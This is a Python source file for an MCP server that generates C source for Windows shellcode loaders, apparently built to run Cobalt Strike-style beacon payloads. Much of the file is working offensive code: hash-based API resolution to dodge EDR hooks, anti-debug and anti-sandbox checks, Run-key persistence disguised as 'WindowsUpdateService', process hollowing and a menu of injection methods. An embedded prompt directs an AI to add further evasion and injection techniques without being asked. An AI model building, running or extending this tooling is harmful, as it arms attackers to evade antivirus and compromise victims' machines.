from mcp.server.fastmcp import FastMCP
import re
import time
from typing import List, Optional
from resource_enhancer import cached_resource, dynamic_generator
from config import LoaderConfig
from load_method_registry import registry

# 创建MCP服务器实例（整合ShellcodeLoader全功能）
mcp = FastMCP("FullFeaturedShellcodeLoader")

# ------------------------------
# 核心工具：全功能Shellcode加载器生成器
# 整合模块踩踏、13种加载方式、加密及反检测
# ------------------------------
@mcp.tool()
def generate_full_loader(
    shellcode_path: str = "beacon.bin",
    encrypt_shellcode: bool = False,  # 是否需要解密（若Shellcode文件已加密）
    encryption_key: Optional[str] = None,  # 解密密钥（encrypt_shellcode=True时必填）
    arch: str = "x64",
    load_method: str = "Dynamic Load",
    sacrificial_dll: str = "C:\\Windows\\System32\\combase.dll",
    enable_debug: bool = False,
    use_dynamic_resolve: bool = False,
    anti_debug: bool = False,
    anti_sandbox: bool = False,
    auto_start: bool = False,
    use_process_hollowing: bool = False,  # 新增进程空洞注入开关
    enable_unhook: bool = False,  # 新增unhook功能
    enable_anti_detection: bool = False  # 新增反检测初始化
) -> str:
    """
    生成具备本地文件读取Shellcode功能的全特性加载器
    
    核心功能（按三步流程组织）：
    第一步 - 运行环境准备：
    - 动态调用初始化
    - Unhook EDR/AV
    - 反检测初始化
    - 自启动配置
    
    第二步 - Shellcode读取和写入：
    - 本地文件读取（读取加密的Shellcode文件）
    - 内存中解密（将加密Shellcode解密为原始Shellcode）
    - 内存分配和写入
    
    第三步 - Shellcode执行：
    - 执行前检查（反调试/反沙箱）
    - 多种加载方式执行
    - 执行后清理
    
    注意：加密流程已优化，用户需要先加密Shellcode文件，然后Loader读取加密文件并在内存中解密。
    """
    # 使用 LoaderConfig 进行参数验证
    try:
        config = LoaderConfig.from_mcp_params(
            shellcode_path=shellcode_path,
            encrypt_shellcode=encrypt_shellcode,
            encryption_key=encryption_key,
            arch=arch,
            load_method=load_method,
            sacrificial_dll=sacrificial_dll,
            use_process_hollowing=use_process_hollowing,
            enable_debug=enable_debug,
            use_dynamic_resolve=use_dynamic_resolve,
            anti_debug=anti_debug,
            anti_sandbox=anti_sandbox,
            auto_start=auto_start
        )
    except ValueError as e:
        return f"错误：{str(e)}"

    # 检查加载方式是否支持
    if not config.is_method_supported(load_method) and not use_process_hollowing:
        return f"错误：{arch}支持的加载方式：{', '.join(config.supported_methods)}"

    # 导入模板渲染器
    from template_renderer import TemplateRenderer
    
    # 创建模板渲染器实例
    renderer = TemplateRenderer()

    # 准备模板变量（按照三步流程组织）
    template_vars = {
        "debug_macro": "#define _DEBUG" if config.enable_debug else "",
        "api_mapping": "",
        "key_code": "",
        "environment_setup_code": "",  # 第一步：环境准备
        "shellcode_io_code": "",        # 第二步：Shellcode IO
        "shellcode_execution_code": "",   # 第三步：Shellcode执行
        "load_method_code": "",          # 加载方式实现
        "main_code": ""                 # 主函数
    }

    # ===============================
    # 第一步：运行环境准备
    # ===============================
    
    # RC4加密/解密模块（如果需要）
    if config.encrypt_shellcode:
        rc4_code = renderer.render_template("modules/rc4.c.j2", {})
    else:
        rc4_code = ""
    
    # 密钥处理（将用户提供的字符串密钥转换为字节数组）
    if config.encrypt_shellcode and config.encryption_key:
        key_bytes = [f"0x{ord(c):02x}" for c in config.encryption_key]
        key_code = f"""
        // 解密密钥（用户指定，字符串转字节数组）
        unsigned char g_encryption_key[] = {{ {', '.join(key_bytes)}, 0x00 }};
        unsigned int g_key_len = {len(config.encryption_key)};
        """
    else:
        key_code = ""
    
    # 动态函数解析（如果需要）
    if config.use_dynamic_resolve:
        debug_macro = template_vars["debug_macro"]
        dynamic_resolve_code = f"""
{debug_macro}
unsigned int HashString(const char* str) {{
    unsigned int hash = 0;
    while (*str) {{
        hash += *str++;
        hash += hash << 10;
        hash ^= hash >> 6;
    }}
    hash += hash << 3;
    hash ^= hash >> 11;
    hash += hash << 15;
    return hash;
}}

void* GetProcAddressByHash(HMODULE hModule, unsigned int targetHash) {{
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHdr->e_lfanew);
    if (ntHdr->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hModule + expDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hModule + expDir->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hModule + expDir->AddressOfFunctions);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {{
        char* name = (char*)hModule + names[i];
        if (HashString(name) == targetHash) {{
            return (void*)((BYTE*)hModule + funcs[ordinals[i]]);
        }}
    }}
    return NULL;
}}

// 函数指针声明
typedef HANDLE (WINAPI *PFN_CreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *PFN_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef LPVOID (WINAPI *PFN_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *PFN_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL (WINAPI *PFN_CloseHandle)(HANDLE);
typedef DWORD (WINAPI *PFN_GetFileSize)(HANDLE, LPDWORD);
typedef HMODULE (WINAPI *PFN_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *PFN_GetProcAddress)(HMODULE, LPCSTR);

// 全局函数指针
PFN_CreateFileW pCreateFileW;
PFN_ReadFile pReadFile;
PFN_VirtualAlloc pVirtualAlloc;
PFN_VirtualProtect pVirtualProtect;
PFN_CloseHandle pCloseHandle;
PFN_GetFileSize pGetFileSize;
PFN_LoadLibraryA pLoadLibraryA;
PFN_GetProcAddress pGetProcAddress;
"""
        api_mapping = """
#define CreateFileW pCreateFileW
#define ReadFile pReadFile
#define VirtualAlloc pVirtualAlloc
#define VirtualProtect pVirtualProtect
#define CloseHandle pCloseHandle
#define GetFileSize pGetFileSize
#define LoadLibraryA pLoadLibraryA
#define GetProcAddress pGetProcAddress
"""
    else:
        dynamic_resolve_code = ""
        api_mapping = ""
    
    # 环境准备代码
    env_setup_vars = {
        "enable_debug": config.enable_debug,
        "enable_unhook": config.enable_unhook,
        "enable_anti_detection": config.enable_anti_detection,
        "use_dynamic_resolve": config.use_dynamic_resolve,
        "anti_debug": config.anti_debug,
        "anti_sandbox": config.anti_sandbox,
        "auto_start": config.auto_start
    }
    
    # 生成环境准备代码（包含反检测、自启动等）
    # 先添加RC4代码和动态解析代码
    environment_setup_code_parts = [rc4_code, dynamic_resolve_code]
    
    # 反调试检测
    if config.anti_debug:
        anti_debug_code = """
// 反调试检测
BOOL CheckDebugger() {
    if (IsDebuggerPresent()) {
        #ifdef _DEBUG
        printf("[!] 检测到调试器\\n");
        #endif
        return TRUE;
    }
    return FALSE;
}
"""
        environment_setup_code_parts.append(anti_debug_code)
    
    # 反沙箱检测
    if config.anti_sandbox:
        anti_sandbox_code = """
// 反沙箱检测
BOOL CheckSandbox() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return TRUE;
    PROCESSENTRY32 pe = {sizeof(pe)};
    int procnum = 0;
    for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe))
        procnum++;
    CloseHandle(hSnapshot);
    if (procnum <= 40) return TRUE;
    return FALSE;
}
"""
        environment_setup_code_parts.append(anti_sandbox_code)
    
    # 自启动配置
    if config.auto_start:
        auto_start_code = """
// 自启动配置
void AutoStart() {
    HKEY hKey;
    WCHAR currentpath[256] = {0};
    if (!GetModuleFileNameW(NULL, currentpath, 256)) return;
    if (!RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", &hKey)) {
        RegSetValueExW(hKey, L"WindowsUpdateService", 0, REG_SZ, (PUCHAR)currentpath, (wcslen(currentpath) + 1) * 2);
        RegCloseKey(hKey);
    }
}
"""
        environment_setup_code_parts.append(auto_start_code)
    
    environment_setup_code = "\n".join(environment_setup_code_parts)
    
    # 使用环境准备模板
    try:
        template_result = renderer.render_template("modules/environment_setup.c.j2", env_setup_vars)
        environment_setup_code += template_result
    except Exception as e:
        # 如果模板渲染失败，使用基础代码
        print(f"[DEBUG] 环境准备模板渲染失败: {e}")
        import traceback
        traceback.print_exc()
        environment_setup_code += f"""
        {template_vars["debug_macro"]}
        BOOL InitializeEnvironment() {{
            #ifdef _DEBUG
            printf("[*] ========== 开始环境初始化 ==========\\\\n");
            #endif
            #ifdef _DEBUG
            printf("[*] ========== 环境初始化完成 ==========\\\\n");
            #endif
            return TRUE;
        }}
        """
    
    template_vars["environment_setup_code"] = environment_setup_code
    template_vars["key_code"] = key_code
    template_vars["api_mapping"] = api_mapping

    # ===============================
    # 第二步：Shellcode读取和写入
    # ===============================
    
    # Shellcode IO代码
    shellcode_io_vars = {
        "enable_debug": config.enable_debug,
        "encrypt_shellcode": config.encrypt_shellcode,
        "use_process_hollowing": config.use_process_hollowing
    }
    
    try:
        shellcode_io_code = renderer.render_template("modules/shellcode_io.c.j2", shellcode_io_vars)
    except Exception as e:
        # 如果模板渲染失败，使用基础代码
        shellcode_io_code = f"""
        {template_vars["debug_macro"]}
        PBYTE ReadShellcodeFromFile(LPCWSTR filePath, PDWORD pSize) {{
            HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) return NULL;
            *pSize = GetFileSize(hFile, NULL);
            PBYTE shellcode = (PBYTE)LocalAlloc(LPTR, *pSize);
            if (!shellcode) {{ CloseHandle(hFile); return NULL; }}
            DWORD bytesRead;
            if (!ReadFile(hFile, shellcode, *pSize, &bytesRead, NULL) || bytesRead != *pSize) {{
                LocalFree(shellcode); CloseHandle(hFile); return NULL;
            }}
            CloseHandle(hFile);
            return shellcode;
        }}

        BOOL LoadShellcode(LPCWSTR filePath, PBYTE* pShellcode, PDWORD pSize) {{
            PBYTE shellcode = ReadShellcodeFromFile(filePath, pSize);
            if (!shellcode) {{
                return FALSE;
            }}
            *pShellcode = shellcode;
            return TRUE;
        }}
        """
    
    template_vars["shellcode_io_code"] = shellcode_io_code
    
    # ===============================
    # 第三步：Shellcode执行
    # ===============================
    
    # Shellcode执行代码
    shellcode_execution_vars = {
        "enable_debug": config.enable_debug,
        "anti_debug": config.anti_debug,
        "anti_sandbox": config.anti_sandbox,
        "encrypt_shellcode": config.encrypt_shellcode,
        "use_process_hollowing": config.use_process_hollowing
    }
    
    try:
        shellcode_execution_code = renderer.render_template("modules/shellcode_execution.c.j2", shellcode_execution_vars)
    except Exception as e:
        # 如果模板渲染失败，使用基础代码
        print(f"模板渲染失败: {e}")
        shellcode_execution_code = ""
    
    template_vars["shellcode_execution_code"] = shellcode_execution_code
    
    # ===============================
    # 加载方式实现
    # ===============================
    try:
        # 尝试从注册表获取加载方式代码
        template_vars["load_method_code"] = registry.generate(
            config.load_method,
            arch=config.arch,
            sacrificial_dll=config.sacrificial_dll
        )
    except ValueError:
        # 如果未注册，回退到原始实现
        template_vars["load_method_code"] = get_load_method_implementation(
            method=config.load_method,
            arch=config.arch,
            sacrificial_dll=config.sacrificial_dll,
            use_process_hollowing=config.use_process_hollowing
        )
    
    # ===============================
    # 进程空洞注入函数（如果需要）
    # ===============================
    if config.use_process_hollowing:
        try:
            template_vars["process_hollowing_code"] = renderer.render_template(
                "load_methods/process_hollowing.c.j2",
                {"enable_debug": config.enable_debug}
            )
        except Exception as e:
            # 如果模板渲染失败，使用基础代码
            template_vars["process_hollowing_code"] = f"""
            // 进程空洞注入加载方式
            void ExecuteProcessHollowing(PBYTE shellcode, SIZE_T shellcodeSize) {{
                #ifdef _DEBUG
                printf("[*] 进程空洞注入方式执行Shellcode\\\\n");
                #endif
                STARTUPINFOA si = {{ sizeof(si) }};
                PROCESS_INFORMATION pi = {{0}};
                if (!CreateProcessA(
                    "C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe",
                    NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi
                )) {{
                    return;
                }}
                ResumeThread(pi.hThread);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }}
            """
    else:
        template_vars["process_hollowing_code"] = ""
    
    # ===============================
    # 主函数（按照三步流程组织）
    # ===============================
    main_code = f"""
int main() {{
    PBYTE shellcode = NULL;
    DWORD shellcodeSize = 0;

    // ========== 第一步：运行环境准备 ==========
    if (!InitializeEnvironment()) {{
        #ifdef _DEBUG
        printf("[!] 环境初始化失败\\n");
        #endif
        return -1;
    }}

    // ========== 第二步：Shellcode读取和写入 ==========
    if (!LoadShellcode(L"{config.shellcode_path}", &shellcode, &shellcodeSize)) {{
        #ifdef _DEBUG
        printf("[!] Shellcode加载失败\\n");
        #endif
        return -1;
    }}

    // ========== 第三步：Shellcode执行 ==========
    if (!ExecuteShellcode(shellcode, shellcodeSize)) {{
        #ifdef _DEBUG
        printf("[!] Shellcode执行失败\\n");
        #endif
        if (shellcode) LocalFree(shellcode);
        return -1;
    }}

    // 清理
    if (shellcode) LocalFree(shellcode);

    #ifdef _DEBUG
    printf("[*] Loader执行完成\\n");
    #endif

    return 0;
}}
"""
    template_vars["main_code"] = main_code

    # ------------------------------
    # 使用模板生成完整代码
    # ------------------------------
    return renderer.render_template("base.c.j2", template_vars)


# ------------------------------
# 辅助函数：加载方式管理
# ------------------------------
def get_supported_load_methods(arch: str) -> List[str]:
    """获取支持的加载方式（32位13种，64位12种）"""
    if arch == "x86":
        return [
            "CreateThreadpoolWait Load", "Fiber Load", "NtTestAlert Load",
            "SEH Except Load", "TLS CallBack Load", "Dynamic Load",
            "Dynamic Load plus", "Syscall Load", "APC-Inject Load",
            "Early Brid APC-Inject Load", "NtCreateSection-Inject Load",
            "OEP Hiijack-Inject Load", "Thread Hiijack-Inject Load",
            "Module Stomp"
        ]
    else:  # x64
        return [
            "CreateThreadpoolWait Load", "Fiber Load", "NtTestAlert Load",
            "SEH Except Load", "TLS CallBack Load", "Dynamic Load",
            "Dynamic Load plus", "Syscall Load", "APC-Inject Load",
            "Early Brid APC-Inject Load", "NtCreateSection-Inject Load",
            "OEP Hiijack-Inject Load", "Thread Hiijack-Inject Load",
            "Module Stomp"
        ]


def get_load_method_implementation(
    method: str,
    arch: str,
    sacrificial_dll: str,
    use_process_hollowing: bool
) -> str:
    """使用模板实现所有加载方式的具体逻辑（已重构为使用注册表）"""
    # 直接调用注册表中的实现
    from load_method_registry import get_load_method_implementation as registry_impl
    return registry_impl(method, arch, sacrificial_dll, use_process_hollowing)


# ------------------------------
# 资源定义：完整技术文档（增强版，带缓存和动态内容）
# ------------------------------
@mcp.resource("loader://full_features")
@cached_resource(maxsize=32, ttl=300)  # 缓存5分钟
def get_full_features() -> str:
    """完整功能说明（动态增强版）"""
    from resource_enhancer import dynamic_generator
    return dynamic_generator.generate_full_features()

@mcp.resource("loader://code_structure")
@cached_resource(maxsize=32, ttl=300)
def get_code_structure() -> str:
    """现有代码结构及可扩展点说明（动态增强版）"""
    from resource_enhancer import dynamic_generator
    return dynamic_generator.generate_code_structure()

@mcp.resource("loader://usage_examples")
@cached_resource(maxsize=32, ttl=300)
def get_usage_examples() -> str:
    """使用示例（覆盖全功能组合与场景化配置，动态增强版）"""
    from resource_enhancer import dynamic_generator
    return dynamic_generator.generate_usage_examples()


# ------------------------------
# 提示生成：引导用户正确调用
# ------------------------------
@mcp.prompt()
def generate_prompt(requirements: str) -> str:
    """生成调用提示，引导功能扩展"""
    return f"""
    请根据需求生成全功能Shellcode加载器，需求：{requirements}
    
    核心功能：{get_full_features().strip()}
    现有代码逻辑：{get_code_structure().strip()}  # 新增：暴露代码结构供AI分析
    使用示例：{get_usage_examples().strip()}
    
    【强制功能扩展要求】：
    1. 基于现有代码的技术路线（如Module Stomp、进程空洞注入、动态API等），自动补充至少1项未覆盖的功能：
       - 加载方式扩展：例如在现有13种基础上，新增“反射DLL注入”“进程 Doppelgänging”等；
       - 反检测增强：在现有反调试/沙箱基础上，添加“Timestomp文件伪装”“内存特征擦除”等；
       - 加密扩展：在RC4基础上，新增AES-256加密、异或动态密钥轮换等；
       - 兼容性优化：添加“系统版本适配（如Win7/Win11差异处理）”“内存页对齐修正”等。
    2. 扩展功能必须与现有代码逻辑兼容（如新增加密算法需适配现有解密流程，新增加载方式需复用动态API解析）。
    3. 生成代码时需包含扩展功能的实现说明（// 扩展：新增XXX功能，基于XXX现有逻辑扩展）。
    
    请指定以下关键参数（含扩展功能相关）：
    - 基础参数：shellcode_file_path、arch、load_method等（同前）
    - 扩展参数：新增功能名称（如new_anti_detect=timestomp）、扩展逻辑说明等
    """


# 启动MCP服务器
if __name__ == "__main__":
    mcp.run(transport='stdio')
